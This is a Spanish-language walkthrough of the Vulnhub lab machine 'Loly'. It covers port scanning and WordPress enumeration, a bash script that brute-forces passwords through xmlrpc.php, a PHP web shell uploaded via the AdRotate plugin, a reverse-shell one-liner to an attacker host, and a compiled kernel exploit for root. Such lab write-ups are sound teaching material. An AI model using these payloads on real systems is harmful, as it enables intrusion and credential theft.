---
layout: single
title: Loly - Vulnhub
date: 26/10/2023
classes: wide
header:
  teaser:

tags:
  - Web Enumeration
  - WordPress Enumeration
  - Abusing xmlrpc.php
  - Bash advanced
  - Abusing AdRotate Manage Media > RCE
  - Kernel Exploitation
  - fácil
  - linux
---

# PortScan

```
 # Nmap 7.93 scan initiated Thu Oct 26 12:15:10 2023 as: nmap -sCV -p80 -oN targeted 192.168.204.155
 Nmap scan report for loly.lc (192.168.204.155)
 Host is up (0.00065s latency).
 
 PORT   STATE SERVICE VERSION
 80/tcp open  http    nginx 1.10.3 (Ubuntu)
 |_http-server-header: nginx/1.10.3 (Ubuntu)
 |_http-title: Welcome to nginx!
 MAC Address: 00:0C:29:C2:90:A8 (VMware)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Thu Oct 26 12:15:17 2023 -- 1 IP address (1 host up) scanned in 7.68 seconds
```

# Sitio Web


![](/assets/images/loly/Pasted image 20231026142343.png)

El sitio web de Loly es bastante básico, por lo que procedemos a buscar nuevas rutas mediante el fuzzing.


```
gobuster dir -u http://192.168.204.155 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

```
/wordpress/           (Status: 200) 
```

El directorio tiene un enlace a un vhost con nombre "**loly.lc**". Agregamos esto a nuestro servidor en el "/etc/hosts" para poder ver el directorio "wordpress" con su respectivo estilo.

Indagando en el Wordpress, vemos un sólo post de único usuario

![](/assets/images/loly/Pasted image 20231026143125.png)

Por lo que ya sabemos un usuario válido.

# Enumeración WordPress

```
gobuster dir -u http://192.168.204.155/wordpress/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash -x php,wp
```

Veremos qué tenemos el "**xmlrpc.php**" expuesto, y otros directorios.
```
/index.php            (Status: 301) [Size: 0] [--> http://192.168.204.155/wordpress/]
/wp-content/          (Status: 200) [Size: 0]                                        
/wp-login.php         (Status: 200) [Size: 6744]                                     
/wp-includes/         (Status: 403) [Size: 178]                                      
/wp-trackback.php     (Status: 200) [Size: 135]                                      
/wp-admin/            (Status: 302) [Size: 0] [--> http://loly.lc/wordpress/wp-login.php?redirect_to=http%3A%2F%2F192.168.204.155%2Fwordpress%2Fwp-admin%2F&reauth=1]
/xmlrpc.php           (Status: 405) [Size: 42]   
```

![](/assets/images/loly/Pasted image 20231026143323.png)

Y nos dice que el XMLRPC sólo acepta peticiones por POST, por lo qué podríamos tratar de abusar de este recurso para obtener las credenciales válidas mediante un script en Bash, y para corroborarlo debemos mandarle una solicitud con el método GET con una estructura XML qué nos permita listar los métodos disponibles del recurso XMLRPC, y sí el método "wp.getUsersBlogs" está activo, podremos realizar un script en bash que mediante fuerza bruta nos permita obtener las credenciales válidas.

```
curl -s -X POST "http://loly.lc/wordpress/xmlrpc.php" -d@file.xml | grep "wp.getUsersBlogs"
```

y como vemos el método está activo.
```
<value><string>wp.getUsersBlogs</string></value>
```

# Fuerza Bruta XMLRPC en bash.

Nos montamos este script en bash.
```
#!/bin/bash


function createXML(){
  password=$1

  xmlFile="""
<?xml version=\"1.0\" encoding=\"utf-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>loly</value></param>
<param><value>$password</value></param>
</params>
</methodCall>"""


  echo $xmlFile > file.xml
  response=$(curl -s -X POST "http://loly.lc/wordpress/xmlrpc.php" -d@file.xml)
  if [ ! "$(echo $response | grep "Incorrect username or password.")" ]; then
    echo -e "\n[+] La contraseña para 'loly' es: $password"
    exit 0 
  fi 

}


cat /usr/share/wordlists/rockyou.txt | while read password; do 
  createXML $password

done
```

Una vez ejecutado, nos dará las credenciales válida del usuario "loly".


# Abuso Plugin AdRotate.

Sí nos fijamos en el plugin AdRotate, podremos subir archivos en formatos .zip y automáticamente se descomprimirían.

![](/assets/images/loly/Pasted image 20231026144909.png)

Por lo que podemos aprovecharnos de subir un código malicioso en **PHP** comprimido el cual nos permita llevar a cabo un RCE desde la URL, para ello debemos convertirlo en zip y posteriormente subirlo.

El código malicioso .PHP tendrá lo siguiente:
```
<?php system($_GET['cmd']); ?>
```

Lo convertimos a zip, para posterior a ello subirlo en el plugin AdRotate, el cual lo descomprimirá y tan sólo se quedará con la extensión .PHP, pero para aprovecharnos de este archivo malicioso que subimos, debemos saber donde se guarda, por lo qué abajo nos deja una pista, que el directorio final sería /banners, y si nos fijamos en el fuzzing que hicimos anteriormente había un directorio /wp-content, donde suele guardarse el contenido de los WordPress, por lo qué el recurso estaría en "/wp-contet/banners/nombre_del_recurso_subido"

![](/assets/images/loly/Pasted image 20231026145053.png)

Y ya desde la URL estamos llevando a cabo un RCE, por lo que podemos entablarnos una Reverse Shell con el típico one line y conectarnos a la máquina.
```
http://loly.lc/wordpress/wp-content/banners/cmd.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/ip_atacante/443%200%3E%261%22
```

# Escalada de Privilegios.

```
uname -a
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```
Sí buscamos esta versión de Kernel en searchsploit, veremos que es vulnerable a escalada de Privilegios. 

![](/assets/images/loly/Pasted image 20231026150048.png)

Por lo que obtenemos este script, para compilarlo, subirlo a la máquina víctima & ejecutarlo desde allí.
```
searchsploit -m linux/local/45010.c
mv 45010.c dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
python3 -m http.server 80
```
Y ya desde la máquina víctima obtenemos el recurso donde tengamos de escritura.
```
wget ip_de_atacante/dirty
chmod +x dirty
./dirty
```
y así escalaremos como ROOT.

![](/assets/images/loly/Pasted image 20231026150312.png)
